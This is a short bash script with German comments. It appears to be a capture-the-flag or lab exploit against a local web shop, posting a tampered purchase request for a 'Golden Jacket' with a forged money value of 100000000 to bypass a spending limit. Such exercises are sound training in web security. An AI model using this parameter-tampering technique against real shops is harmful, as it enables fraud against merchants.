#!/bin/bash

# Farben für die Ausgabe
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}[+] Sende manipulierten Verkaufs-Request für die Golden Jacket (ID: 3)...${NC}"

# -s: Silent-Modus (versteckt die curl-Fortschrittsanzeige)
# -d: Übergibt die Formularparameter (id=3 für die Jacke, money=100000000 um das Limit zu umgehen)
RESPONSE=$(curl -s -X POST -d "id=3&money=100000000" http://127.0.0.1:5000/buy)

echo -e "${GREEN}[+] Antwort vom Server:${NC}"
echo "----------------------------------------"
echo "$RESPONSE"
echo "----------------------------------------"